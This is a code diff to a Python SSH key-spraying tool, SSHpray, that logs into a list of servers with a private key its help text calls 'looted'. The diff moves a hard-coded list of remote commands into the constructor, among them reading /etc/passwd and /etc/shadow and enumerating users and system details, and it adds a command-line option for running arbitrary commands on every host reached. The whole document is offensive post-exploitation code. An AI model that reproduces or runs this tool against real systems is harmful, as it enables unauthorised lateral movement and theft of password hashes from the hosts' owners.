@@ -25,6 +25,10 @@ class SSHpray():
 		self.domainResult=set()
 		self.userName=None
 
+
+		#command(s) to run
+		self.remote_commands = ['cat /etc/passwd;','cat /etc/shadow;','uname -a;','w;','who -a;','exit']
+
 	def check_args(self):
 
 		print(self.args)
@@ -48,6 +52,10 @@ class SSHpray():
 			self.userName = os.getlogin()
 		else:
 			self.userName = self.args.username
+
+		if self.args.commands is not None:
+			self.remote_commands = ''.join(self.args.commands)
+
 
 		#self.read_targets()
 
@@ -141,8 +149,7 @@ class SSHpray():
 
 		for i, t in enumerate(self.targetSet):
 
-			#command(s) to run, add more one per line and end with a semicolon
-			self.remote_commands = ['cat /etc/passwd;','cat /etc/shadow;','uname -a;','w;','who -a;','exit']
+
 			
 
 			if self.args.verbose is True: print ("[+] Attempting to SSH to %s" % (t) )
@@ -183,8 +190,8 @@ def main():
 	#gather options
 	parser = argparse.ArgumentParser()
 
-
-	parser.add_argument('-i', '--ipaddress', metavar='127.0.0.1', help='single ip to test')
+	parser.add_argument('-c', '--commands', metavar='<command>', help='command to run')
+	parser.add_argument('-i', '--ipaddress', metavar='<ip address>', help='single ip to test')
 	parser.add_argument('-k', '--keyfile', metavar='<keyfile>', help='private key that you have looted')
 	parser.add_argument('-t', '--targets', metavar='<targetfile>', help='list of ssh servers in a file, one per line')
 	parser.add_argument('-u', '--username', metavar='<username>', help='username associated with key, default is current local user')
